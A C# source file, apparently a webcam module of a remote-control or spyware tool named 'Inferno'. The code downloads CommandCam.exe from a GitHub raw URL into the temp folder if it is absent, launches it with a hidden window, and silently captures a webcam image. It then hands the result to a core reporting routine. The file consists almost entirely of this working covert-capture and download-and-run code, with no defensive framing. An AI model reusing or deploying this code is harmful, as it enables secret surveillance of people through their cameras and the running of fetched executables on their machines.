using System;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace Inferno
{
    internal class webcam
    {

        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        public static string commandCamPATH = Environment.GetEnvironmentVariable("temp") + "\\CommandCam.exe";
        public static string commandCamLINK = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";

        // Capture image from webcam
        public static void Screenshot(string filename = "screenshot.jpg", int delay = 4500, int camera = 1)
        {
            // Check if CommandCam.exe file exists
            if(!File.Exists(commandCamPATH)) {
                WebClient webClient = new WebClient();
                webClient.DownloadFile(commandCamLINK, commandCamPATH);
            }
            // Check if file exists
            if (File.Exists(filename))
            {
                File.Delete(filename);
            }
            // Create screenshot
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = commandCamPATH;
            startInfo.Arguments = "/filename \"" + filename + "\" /delay " + delay + " /devnum " + camera;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            // Out
            output.filename = filename;
            output.delay = delay;
            output.camera = camera;

            // Check
            if (File.Exists(filename)) {
                core.Exit("Webcam image saved", output);
            } else
            {
                output.error = true;
                core.Exit("Webcame device not found!", output, 3);
            }
        }
    }
}
